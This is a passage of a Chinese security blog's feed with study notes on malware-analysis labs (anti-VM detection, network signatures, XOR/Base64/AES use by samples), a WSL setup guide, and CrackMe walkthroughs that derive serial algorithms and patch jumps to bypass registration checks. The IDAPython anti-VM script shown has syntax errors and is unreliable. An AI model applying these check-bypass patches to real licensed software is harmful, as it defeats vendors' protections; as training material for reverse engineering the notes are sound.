class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> idautils <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> idc <span class="hljs-keyword">import</span> *<br>heads = Heads(SegStart(ScreenEA()),SegEnd(ScreenEA()))<br>antiVM = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> heads:<br>    <span class="hljs-keyword">if</span>(GetMnem(i) == <span class="hljs-string">&quot;sidt&quot;</span> <span class="hljs-keyword">or</span><br>      GetMnem(i) == <span class="hljs-string">&quot;sgdt&quot;</span> <span class="hljs-keyword">or</span><br>      GetMnem(i) == <span class="hljs-string">&quot;sldt&quot;</span> <span class="hljs-keyword">or</span><br>      GetMnem(i) == <span class="hljs-string">&quot;smsw&quot;</span> <span class="hljs-keyword">or</span><br>      GetMnem(i) == <span class="hljs-string">&quot;str&quot;</span> <span class="hljs-keyword">or</span><br>      GetMnem(i) == <span class="hljs-string">&quot;in&quot;</span> <span class="hljs-keyword">or</span><br>      GetMnem(i) == <span class="hljs-string">&quot;cpuid&quot;</span> <span class="hljs-keyword">or</span>):<br>        antiVM.append()<br>     <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Number of potential Anti_VM instructions:%d&quot;</span> % (<span class="hljs-built_in">len</span>(antiVM))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> antiVM:<br>SetColor(i,CIC_ITEM,<span class="hljs-number">0x0000ff</span>)<br>    Message(<span class="hljs-string">&quot;Anti_VM:%08x\n&quot;</span> % i)<br></code></pre></td></tr></table></figure><p><strong>使用ScoopyNG：</strong>这是一款免费的VMware检测工具，它实现了对虚拟机的其中不同检测。</p><p><strong>虚拟机逃逸：</strong>VMware中存在一些安全漏洞，可以利用这些漏洞来世操作系统崩溃活在宿主系统中运行代码，共享文件夹功能或者共享工具中发现了很多公开的漏洞，禁用共享文件夹功能可阻止这类攻击。</p><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab17-1"><a href="#Lab17-1" class="headerlink" title="Lab17-1"></a>Lab17-1</h3><hr><h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
      <tag>恶意代码分析</tag>
      
      <tag>反虚拟机技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>恶意代码的网络特征</title>
    <link href="/2019/04/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E7%9A%84%E7%BD%91%E7%BB%9C%E7%89%B9%E5%BE%81/"/>
    <url>/2019/04/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E7%9A%84%E7%BD%91%E7%BB%9C%E7%89%B9%E5%BE%81/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>OPSEC-操作安全性：攻击者可以通过多种方法来探测到是否有研究人员对恶意代码进行的测试：</p><ul><li>发送带有某个特定连接的针对性访问的网络钓鱼邮件，观察是否有从期望区域之外的IP地址的访问请求</li><li>设计一种利用方式，在博客篇评论中创建一个经过编码的链接，从而创建一个私人但是可以公开的感染审计记录</li><li>在恶意代码中嵌入一个未使用的域名，观察这个域名的解析记录</li></ul><p><strong>Snort检测：</strong><a href="https://www.snort.org/">https://www.snort.org/</a></p><span id="more"></span><p><strong>寻找网络操作代码：</strong>评估网络通信的第一步是找到用于执行通信的系统调用,Windows套接字中的部分API是最常见的底层函数。使用这个API接口的恶意代码通常会使用如下函数：WSAStartup、getaddrinfo、socket、connect send、recv和WSAGetLastError。恶意代码可能会使用名为InternetOpen、InternetConnect、InternetOpenURL、HTTPOpenRequest、HTTPQueryInfo、HTTPSendRequest、InternetReadFile、InternetWriteFile这些API。另一种用于网络通信的API组件对象模型接口（COM）接口。通过如URLDowownloadToFile等函数隐式使用COM的情况非常常见，但是显式使用COM的情况则非常少见，显式使用COM的恶意代码通常使用CoInitalize、CoCreateInstance和Navigate等函数，例如显示使用COM创建一个浏览器对象，可以让恶意代码混淆流量，因为这与浏览器的流量完全一直，同时也能在网络流量之有效掩盖恶意代码的行为和连接。</p><p><strong>了解网络内容的来源：</strong>下面是一些基本的数据源：</p><ul><li>随机数据（例如调用生成伪随机值函数所返回的数据）</li><li>来源于标准网络库的数据（例如调用HttpSendREquest创建的GET请求）</li><li>来源于恶意代码硬编码数据</li><li>关于主机及及其配置的数据</li><li>从其他来源接收的数据</li></ul><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab14-1"><a href="#Lab14-1" class="headerlink" title="Lab14-1"></a>Lab14-1</h3><hr><h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
      <tag>恶意代码分析</tag>
      
      <tag>网络流量识别</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据加密</title>
    <link href="/2019/04/%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/"/>
    <url>/2019/04/%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><strong>分析加密算法的目的：</strong>恶意代码使用加密来达到各种各样的目的，最常见的是加密网络通信，同时，唯一代码也会用加密来隐藏它的内部工作：</p><ul><li>隐藏配置信息</li><li>窃取信息之前将它保存到一个临时文件</li><li>存储需要的字符串</li><li>将恶意代码伪装成一个合法的工具</li></ul><span id="more"></span><p><strong>简单的加密算法：</strong>简单算法的好处如下：</p><ul><li>体积小，可以存放在空间较小的代码环境中如shellcode</li><li>没有复杂算法那么显眼，不易被发现</li><li>开销低，几乎对性能没有影响</li></ul><p><strong>凯撒密码：</strong>凯撒密码使用字符串的移位来加密信息。</p><p><strong>XOR加密：</strong>用异或逻辑来实现加密，是一种单密钥加密方法。</p><p><strong>其他简单加密算法：</strong></p><ul><li>ADD，SUB：编码算法可以用与XOR相似的方式在单个字节上使用ADD和SUB。</li><li>ROL，ROR：他们旋转字节中左侧与右侧的比特位，同样不可逆，需要配合使用。</li><li>ROT：原始的凯撒密码，它通常使用字母字符或者ASCII中94个可打印字符。</li><li>Multibyte：与单字节不同，这个算法可能使用一个较常的密钥，通常是4个或者8个字符长度，为了方便，它通常异或每个块。</li><li>链或环：这个算法使用内容本身作为密钥，有多种实现，最常见的原始密钥用在明文的两端，开头或者结尾，编码过输出字符作为下一个字符的密钥。</li></ul><p><strong>Base64加密：</strong>Base64编码将二进制数据转换成64个字符的有限字符集。对于不同的base64加密有多种不同的策略或字母表。但是他们都是用一个额外的字符标识填充，通常是&#x3D;。最常用的字符集是MIME字符集，他使用A<del>Z，a</del>z和0~9作为前62个值使用+和&#x2F;作为最后的两个值。</p><p><strong>常见的标准加密算法特征（相对于恶意代码来说）：</strong></p><ul><li>加密库很大，所以恶意代码需要静态的继承或者链接到已有的代码中</li><li>链接主机上现有的代码可能降低可移植性</li><li>标准加密库比较容易探测</li><li>对称加密算法需要考虑如何隐藏密钥</li></ul><p><strong>识别字符串和导入：</strong>可以通过加密库中自带的字符串作为特征来识别恶意代码使用了哪些加密库。</p><p><strong>寻找加密常量：</strong>第三方检测加密的方法是使用可以搜索常见加密常量的工具：</p><ul><li>FindCrypt2：它会搜索程序中任何与加密算法相关的已知常量，因为大部分加密算法会使用与基本加密算法结构相关的一些固定位串。值得注意的是国际数据加密算法IDEA和RC4算法动态地创建他们地结构，因此他们无法通过这种方式识别。</li><li>Krypto ANALyzer：这个工具可以识别常见加密算法的特征，可以识别的算法很多但是误报率页比较高。</li></ul><p><strong>查找高熵值的内容：</strong>除了识别潜在的明显的加密常量或者加密密钥外，这种技术也可以识别加密内容本身，由于这种技术的影响广泛，可以适用于没有找到加密常量的地方如RC4。高熵内容技术相当迟钝，最好作为最后一种使用手段，多种类型的内容，如视频音频压缩数据也可能会显示高熵值，除了他们的头部特征以外，很难与加密数据区分。</p><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab13-1"><a href="#Lab13-1" class="headerlink" title="Lab13-1"></a>Lab13-1</h3><p><strong>分析恶意代码文件Lab13-01.exe。</strong></p><p><strong>问题</strong></p><p><strong>1.比较恶意代码中的字符串（字符串命令的输出）域动态分析提供的有用信息，基于这些比较，哪些元素可能被加密？</strong></p><p>资源节中的一段数据、hostname、</p><p><strong>2.使用IDA Pro搜索恶意代码中字符串xor，以此来查找潜在的加密，你发现了哪些加密类型？</strong></p><p>循环加密</p><p><strong>3.恶意代码使用什么密钥加密。加密了什么内容？</strong></p><p>0x3B 、资源节中的一段数据</p><p><strong>4.使用静态工具FindCrypt2、Krypto ANALyzer（KANAL）以及IDA熵插件识别一些其他类型的加密机制，你发现了什么？</strong></p><p>网上的东西鱼龙混杂，不敢下，告辞！</p><p><strong>5.什么类型的加密被恶意代码用来发送部分网络流量？</strong></p><p>Base64</p><p><strong>6.Base64编码函数在反汇编的何处？</strong></p><p>函数<code>sub_4010B1</code></p><p>本人虚拟hostname是DESKTOP-KH4V经过base64加密之后生成了REVTS1RPUC1LSDRW</p><p><strong>7.恶意代码发送的Base64加密数据的最大长度是什么？加密了什么内容？</strong></p><p>最长12个字节的计算机名</p><p><strong>8.恶意代码中，你是否在Base64加密数据中看到了填充字符&#x3D;或者&#x3D;&#x3D;？</strong></p><p>如果主机名长度小于12个字节且不能被3整除则会使用填充字符。</p><p><strong>9.这个恶意代码做了什么？</strong></p><p>用加密的主机名向<a href="http://www.practicalmalwareanalysis.com发送消息./">www.practicalmalwareanalysis.com发送消息。</a></p><h3 id="Lab13-2"><a href="#Lab13-2" class="headerlink" title="Lab13-2"></a>Lab13-2</h3><p><strong>问题</strong></p><p><strong>1.使用动态分析，确定恶意代码创建了什么？</strong></p><p>在<code>WindowsXP</code>下运行代码发现程序不断在其所在目录不断创建新的文件类似名为<code>temp00087b24</code>的文件。</p><p><strong>2.使用静态工具FindCrypt2、Krypto ANALyzer（KANAL）以及IDA熵插件识别一些其他类型的加密机制，你发现了什么？</strong></p><p>略</p><p><strong>3.基于问题1的回答，哪些导入函数将是寻找加密函数比较好的一个证据？</strong></p><p><code>WriteFile</code></p><p><strong>4.加密函数在反汇编的何处？</strong></p><p><code>sub_401739</code></p><p><strong>5.从加密函数追溯原始的加密内容，原始加密内容是什么？</strong></p><p>其实只看API函数是一些与窗口，色深等相关的就可以差不多猜出这个可能是截图收集。</p><p>那么直接将加密函数的调用nop掉试一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">0040187F  | 50                | push eax                     |<br>00401880  | 90                | nop                          | 加密函数<br>00401881  | 90                | nop                          |<br>00401882  | 90                | nop                          |<br>00401883  | 90                | nop                          |<br>00401884  | 90                | nop                          |<br>00401885  | 83C4 08           | add esp,8                    |<br>00401888  | FF15 38604000     | call dword ptr ds:[&lt;&amp;GetTick |<br></code></pre></td></tr></table></figure><p>可以将生成的文件后缀修改为bmp打开就是屏幕截图。</p><p><strong>6.你是否能够找到加密算法？如果没有，你如何解密这些内容？</strong></p><p>在内存上将要加密的数据替换为加密后的数据即可。</p><p><strong>7.使用解密工具，你是否能够恢复加密文件中的一个文件到原始文件？</strong></p><p>略</p><h3 id="Lab13-3"><a href="#Lab13-3" class="headerlink" title="Lab13-3"></a>Lab13-3</h3><p><strong>分析恶意代码文件Lab13-03.exe。</strong></p><p><strong>问题</strong></p><p><strong>1.比较恶意代码的输出字符串和动态分析提供的信息，通过这些比较，你发现哪些元素可能被加密？</strong></p><p>字符串较乱，暂未找到有用信息</p><p><strong>2.使用静态分析搜索字符串xor来查找潜在的加密。通过这种方法，你是发现什么类型的加密？</strong></p><p>暂无</p><p><strong>3.使用静态工具FindCrypt2、Krypto ANALyzer（KANAL）以及IDA熵插件识别一些其他类型的加密机制，发现的结果与搜索字符XOR结果比较如何？</strong></p><p>略</p><p><strong>4.恶意代码使用哪两种加密技术？</strong></p><p>Base64和AES</p><p><strong>5.对于每一种加密技术，他们的密钥是什么？</strong></p><p>AES：ijklmnopqrstuvwx</p><p>Base64：CD……AB…….</p><p><strong>6.对于加密算法，它的密钥足够可靠吗？另外你必须知道什么？</strong></p><p>AES</p><p><strong>7.恶意代码做了什么？</strong></p><p>恶意代码使用自定义的Base64加密算法加密传入命令和AES加密的Shell命令来建立反连命令shell。</p><hr><h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
      <tag>恶意代码分析</tag>
      
      <tag>加密</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows10安装Linux子系统</title>
    <link href="/2019/04/Windows10%E5%AE%89%E8%A3%85Linux%E5%AD%90%E7%B3%BB%E7%BB%9F/"/>
    <url>/2019/04/Windows10%E5%AE%89%E8%A3%85Linux%E5%AD%90%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<p>开启开发者模式：</p><p><img src="https://i.loli.net/2019/04/19/5cb9d1caac36b.png"></p><span id="more"></span><p>控制面板</p><p><img src="https://i.loli.net/2019/04/19/5cb9d25e414b5.png"></p><p>安装完成之后需要重启，重启之后在Windows应用商店中选择自己喜欢的Linux发行版本，我选择<del>Kali</del>，算了算了，看了评论都说Kali的更新源不可用甚至可能导致蓝屏，之前使用物理机Kali因为不稳定而系统损坏的我只想说：告辞！！！，还是用Ubuntu吧，可能会稳定一些：</p><p><img src="https://i.loli.net/2019/04/19/5cb9d2e9b88c7.png"></p><p>安装中：</p><p><img src="https://i.loli.net/2019/04/19/5cb9d4cf5676e.png"></p><p>。。。。。。</p><p><img src="https://i.loli.net/2019/04/19/5cb9d50b3d2d2.png"></p><p>🍃</p><p>百度了一下：</p><p>PowerShell管理员权限执行如下命令：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/19/5cb9d59cc3b81.png"></p><p>安装成功且不需要重启，很好</p><p>启动成功，注意这里输入的账户名和密码要记好，输入密码时屏幕不显示，但实际上已经输入了，给没用过Linux的小白提个醒：</p><p><img src="https://i.loli.net/2019/04/19/5cb9d6bda02fd.png"></p><p>大功告成！</p>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>Linux子系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>160个CrackMe练习</title>
    <link href="/2019/04/160%E4%B8%AACreakMe%E7%BB%83%E4%B9%A0/"/>
    <url>/2019/04/160%E4%B8%AACreakMe%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>160个CrackMe题目量较大，而且有些CM逻辑重复度较高，因此挑选一些比较有价值的题目做一下以提高本🥦（菜）的逆向水平。</p><h1 id="0x01-Acid-burn"><a href="#0x01-Acid-burn" class="headerlink" title="0x01 Acid burn"></a>0x01 Acid burn</h1><p><img src="https://i.loli.net/2019/04/16/5cb51ad1cb4b9.png"></p><p>在x64dbg里查找字符串找到相关的错误提示，找到相关调用地址，在附近找到疑似关键跳转的部分下断：</p><p><img src="https://i.loli.net/2019/04/16/5cb52e684f522.png"></p><span id="more"></span><p>在此处函数调用之后出现了序列号的关键部分：</p><p><img src="https://i.loli.net/2019/04/16/5cb52f19b9e22.png"></p><p>序列号拼接之后得出name为<code>1234</code>，serial为<code>CW-4018-CRACKED</code></p><p>跟踪一波算法：</p><p><img src="https://i.loli.net/2019/04/16/5cb53c6ab502c.png"></p><p><img src="https://i.loli.net/2019/04/16/5cb53c48587d2.png"></p><p>总结一下就是：<code>CW-itoa((用户的name的第一个字符的ascii码)*0x29*2)-CRACKED</code></p><p>第二部分直接检验serial的不必多说，找到判断函数，可以直接看到目标serial：</p><p><img src="https://i.loli.net/2019/04/16/5cb53df1cab97.png"></p><p><img src="https://i.loli.net/2019/04/18/5cb85b7d7ed71.png"></p><h1 id="0x02-Afkayas-1"><a href="#0x02-Afkayas-1" class="headerlink" title="0x02 Afkayas_1"></a>0x02 Afkayas_1</h1><p>本来是写好了的但是这部分忘记保存导致丢失因此就简要写一下吧：</p><p>首先根据字符串找到判断位置：</p><p><img src="https://i.loli.net/2019/04/16/5cb54799706af.png"></p><p>单步运行可以找到对应<code>abcd</code>的serial:<code>AKA-390221</code></p><p><img src="https://i.loli.net/2019/04/16/5cb5464b61d95.png"></p><p><img src="https://i.loli.net/2019/04/16/5cb54613bf1dd.png"></p><p>下面分析一下算法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asm">004023F7   | 68 A0000000       | push A0                                      |<br>004023FC   | 68 5C1B4000       | push afkayas.1.401B5C                        |<br>00402401   | 53                | push ebx                                     |<br>00402402   | 50                | push eax                                     |<br>00402403   | FF15 04414000     | call dword ptr ds:[&lt;&amp;__vbaHresultCheckObj&gt;]  |<br>00402409   | 8B95 50FFFFFF     | mov edx,dword ptr ss:[ebp-B0]                |<br>0040240F   | 8B45 E4           | mov eax,dword ptr ss:[ebp-1C]                | [ebp-1C]:L&quot;abcd&quot;<br>00402412   | 50                | push eax                                     |<br>00402413   | 8B1A              | mov ebx,dword ptr ds:[edx]                   |<br>00402415   | FF15 E4404000     | call dword ptr ds:[&lt;&amp;__vbaLenBstr&gt;]          |<br>0040241B   | 8BF8              | mov edi,eax                                  |<br>0040241D   | 8B4D E8           | mov ecx,dword ptr ss:[ebp-18]                | [ebp-18]:L&quot;abcd&quot;<br>00402420   | 69FF FB7C0100     | imul edi,edi,17CFB                           |<br>00402426   | 51                | push ecx                                     |<br>00402427   | 0F80 91020000     | jo afkayas.1.4026BE                          |<br>0040242D   | FF15 F8404000     | call dword ptr ds:[&lt;&amp;rtcRightVar&gt;]           |<br>00402433   | 0FBFD0            | movsx edx,ax                                 |<br>00402436   | 03FA              | add edi,edx                                  |<br>00402438   | 0F80 80020000     | jo afkayas.1.4026BE                          |<br>0040243E   | 57                | push edi                                     |<br>0040243F   | FF15 E0404000     | call dword ptr ds:[&lt;&amp;__vbaStrI4&gt;]            |<br></code></pre></td></tr></table></figure><p>总结一下就是</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">serial = hex2dec(<span class="hljs-keyword">strlen</span>(<span class="hljs-keyword">name</span>)*<span class="hljs-number">0</span>x17CFB + <span class="hljs-keyword">name</span>[<span class="hljs-number">0</span>])<br></code></pre></td></tr></table></figure><h1 id="0x03-Afkayas-2"><a href="#0x03-Afkayas-2" class="headerlink" title="0x03 Afkayas_2"></a>0x03 Afkayas_2</h1><p>单步走找到对应name：<code>name</code>的serial：<code>1066990</code></p><p><img src="https://i.loli.net/2019/04/17/5cb690c17ea11.png"></p><p>接下来写注册机，先看算法：</p><p>第一步跟上一题一样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asm">004081F2   | 50                | push eax                                     | eax:L&quot;355662&quot;<br>004081F3   | 8B1A              | mov ebx,dword ptr ds:[edx]                   | edx:L&quot;355662&quot;<br>004081F5   | FF15 F8B04000     | call dword ptr ds:[&lt;&amp;__vbaLenBstr&gt;]          | 获取name字段长度<br>004081FB   | 8BF8              | mov edi,eax                                  | edi:L&quot;-1-0&quot;, eax:L&quot;355662&quot;<br>004081FD   | 8B4D E8           | mov ecx,dword ptr ss:[ebp-18]                | [ebp-18]:L&quot;name&quot;<br>00408200   | 69FF 385B0100     | imul edi,edi,15B38                           | strlen(name)*0x15b38=0x56ce0<br>00408206   | 51                | push ecx                                     |<br>00408207   | 0F80 B7050000     | jo afkayas.2.4087C4                          |<br>0040820D   | FF15 0CB14000     | call dword ptr ds:[&lt;&amp;rtcRightVar&gt;]           |<br>00408213   | 0FBFD0            | movsx edx,ax                                 | edx:L&quot;355662&quot;<br>00408216   | 03FA              | add edi,edx                                  | (strlen(name)*0x15b38)+name[0]=0x56d4e<br>00408218   | 0F80 A6050000     | jo afkayas.2.4087C4                          |<br>0040821E   | 57                | push edi                                     | edi:L&quot;-1-0&quot;<br>0040821F   | FF15 F4B04000     | call dword ptr ds:[&lt;&amp;__vbaStrI4&gt;]            | hex2dec 355662<br>00408225   | 8BD0              | mov edx,eax                                  | edx:L&quot;355662&quot;, eax:L&quot;355662&quot;<br>00408227   | 8D4D E0           | lea ecx,dword ptr ss:[ebp-20]                |<br></code></pre></td></tr></table></figure><p>第二部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">0040832A   | DD1C24            | fstp qword ptr ss:[esp],st(0)                |<br>0040832D   | FF15 48B14000     | call dword ptr ds:[&lt;&amp;__vbaStrR8&gt;]            | serial+=(10.0/5.0) = 355664<br>00408333   | 8BD0              | mov edx,eax                                  | eax:L&quot;355664&quot;<br>00408335   | 8D4D E4           | lea ecx,dword ptr ss:[ebp-1C]                |<br>00408338   | FF15 94B14000     | call dword ptr ds:[&lt;&amp;__vbaStrMove&gt;]          |<br>0040833E   | 899D 34FFFFFF     | mov dword ptr ss:[ebp-CC],ebx                |<br>00408344   | 8B9D 58FFFFFF     | mov ebx,dword ptr ss:[ebp-A8]                |<br></code></pre></td></tr></table></figure><p>第三部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs asm">004083F2   | 52                 | push edx                                     |<br>004083F3   | 8B19               | mov ebx,dword ptr ds:[ecx]                   |<br>004083F5   | FF15 74B14000      | call dword ptr ds:[&lt;&amp;__vbaR8Str&gt;]            |<br>004083FB   | DC0D 10104000      | fmul st(0),qword ptr ds:[401010]             |<br>00408401   | 83EC 08            | sub esp,8                                    |<br>00408404   | DC25 18104000      | fsub st(0),qword ptr ds:[401018]             |<br>0040840A   | DFE0               | fnstsw ax                                    |<br>0040840C   | A8 0D              | test al,D                                    |<br>0040840E   | 0F85 AB030000      | jne afkayas.2.4087BF                         |<br>00408414   | DD1C24             | fstp qword ptr ss:[esp],st(0)                |<br>00408417   | FF15 48B14000      | call dword ptr ds:[&lt;&amp;__vbaStrR8&gt;]            |<br>0040841D   | 8BD0               | mov edx,eax                                  | eax:L&quot;1066990&quot;<br>0040841F   | 8D4D E4            | lea ecx,dword ptr ss:[ebp-1C]                |<br>00408422   | FF15 94B14000      | call dword ptr ds:[&lt;&amp;__vbaStrMove&gt;]          |<br>00408428   | 899D 2CFFFFFF      | mov dword ptr ss:[ebp-D4],ebx                |<br>0040842E   | 8B9D 58FFFFFF      | mov ebx,dword ptr ss:[ebp-A8]                |<br>00408434   | 50                 | push eax                                     | eax:L&quot;1066990&quot;<br></code></pre></td></tr></table></figure><p>总结算法：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">serial</span> = hex2dec((strlen(name)*<span class="hljs-number">0</span>x15b38 + name[<span class="hljs-number">0</span>]+<span class="hljs-number">2</span>)*<span class="hljs-number">3</span>-<span class="hljs-number">2</span>-(-<span class="hljs-number">15</span>))<br></code></pre></td></tr></table></figure><h1 id="0x04-ajj-1"><a href="#0x04-ajj-1" class="headerlink" title="0x04 ajj_1"></a>0x04 ajj_1</h1><p>OD可以搜索到中文字符串，但是x64dbg搜不到，可能是x64dbg对中文字符串的搜索支持不是太好吧：</p><p><img src="https://i.loli.net/2019/04/17/5cb6e3595adf0.png"></p><p>向上找到关键跳转：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">0045802F   | 75 AB              | jne ckme.457FDC                              |<br>00458031   | 81BE 0C030000 8500 | cmp dword ptr ds:[esi+30C],85                |<br>0045803B   | 75 76              | jne ckme.4580B3                              |<br></code></pre></td></tr></table></figure><p>直接修改ZF寄存器强制不跳转：</p><p><img src="https://i.loli.net/2019/04/17/5cb6e7b91962f.png"></p><h1 id="0x05-ajj-2"><a href="#0x05-ajj-2" class="headerlink" title="0x05 ajj_2"></a>0x05 ajj_2</h1><p>发现加了UPX壳，先脱壳，脱壳后继续分析。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">D:\Tools\Security_Tools\010\upx-3.95-win64\upx-3.95-win64&gt;upx.exe -d CKme002.exe<br>                       Ultimate Packer <span class="hljs-keyword">for</span> eXecutables<br>                          Copyright (C) 1996 - 2018<br>UPX 3.95w       Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018<br><br>        File size         Ratio      Format      Name<br>   --------------------   ------   -----------   -----------<br>    458752 &lt;-    146432   31.92%    win32/pe     CKme002.exe<br><br>Unpacked 1 file.<br></code></pre></td></tr></table></figure><p>这道题好像看起来有点复杂，从看雪工具包中下载Delphi的反汇编工具：<a href="https://tools.pediy.com/win/decompilers.htm">DeDe</a></p><p>分析文件看到如下事件：</p><p><img src="https://i.loli.net/2019/04/17/5cb73e873372b.png"></p><p>分别查看这些事件的代码，在Timer2Timer中看到如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asm">004473E4   53                     push    ebx<br>004473E5   8BD8                   mov     ebx, eax<br>004473E7   81BB04030000340C0000   cmp     dword ptr [ebx+$0304], $00000C34<br>004473F1   0F8488000000           jz      0044747F<br>004473F7   81BB080300000D230000   cmp     dword ptr [ebx+$0308], $0000230D<br>00447401   747C                   jz      0044747F<br>00447403   81BB10030000940F0000   cmp     dword ptr [ebx+$0310], $00000F94<br>0044740D   7570                   jnz     0044747F<br>0044740F   8B8318030000           mov     eax, [ebx+$0318]<br>00447415   3B8314030000           cmp     eax, [ebx+$0314]<br>0044741B   7562                   jnz     0044747F<br>0044741D   81BB1C030000E7030000   cmp     dword ptr [ebx+$031C], $000003E7<br>00447427   7456                   jz      0044747F<br>00447429   33D2                   xor     edx, edx<br></code></pre></td></tr></table></figure><p>修改跳转逻辑之后可以看到注册成功的界面：</p><p><img src="https://i.loli.net/2019/04/17/5cb7408d5ab85.png"></p><h1 id="0x06-aLoNg3x-1"><a href="#0x06-aLoNg3x-1" class="headerlink" title="0x06 aLoNg3x_1"></a>0x06 aLoNg3x_1</h1><p>还是一个Delphi程序，DeDe看一下发现几个比较重要的事件，分别下断分析函数执行逻辑。</p><p>在ResoucesHacker中可以看到窗口控件的信息：</p><p><img src="https://i.loli.net/2019/04/18/5cb856c560034.png"></p><p>在<code>00442E22</code>处看到一个<code>cmp</code>，修改跳转路径之后发现ok按钮可用了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 